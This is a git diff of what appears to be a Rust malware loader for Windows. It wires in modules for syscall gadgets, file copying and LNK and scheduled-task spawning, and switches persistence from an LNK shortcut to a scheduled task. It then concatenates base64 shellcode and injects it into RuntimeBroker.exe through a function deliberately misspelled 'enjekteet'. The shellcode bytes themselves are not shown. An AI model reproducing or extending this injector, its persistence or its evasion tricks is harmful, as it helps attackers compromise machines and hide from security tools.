@@ -12,6 +12,7 @@ use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
 use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
 use base64::{Engine as _, engine::general_purpose};
 
+#[path = "src/syscall.rs"]
 mod syscall;
 
 global_asm!(r#"
@@ -474,14 +475,20 @@ fn enjekteet(target_name: &str, shellcode_b64: &str, gadgets: &syscall::Gadgets)
     if status == 0 { Some(()) } else { None }
 }
 
+#[path = "src/syscalls_filecopy.rs"]
 mod syscalls_filecopy;
+#[path = "src/filecopy.rs"]
 mod filecopy;
+#[path = "src/lnkspawner.rs"]
 mod lnkspawner;
+#[path = "src/taskspawner.rs"]
+mod taskspawner;
 fn main() {
     validate_system_configuration();
     let gadgets = syscall::get_nt_gadgets().expect("G4dg3s not found");
 	
-	lnkspawner::spawn_lnk().unwrap();
+	// lnkspawner::spawn_lnk().unwrap();
+    taskspawner::create_task().unwrap();
 
 	let AMKOD1 = format!("{}{}", SH1, SH2);
 	enjekteet("RuntimeBroker.exe", &AMKOD1, &gadgets);
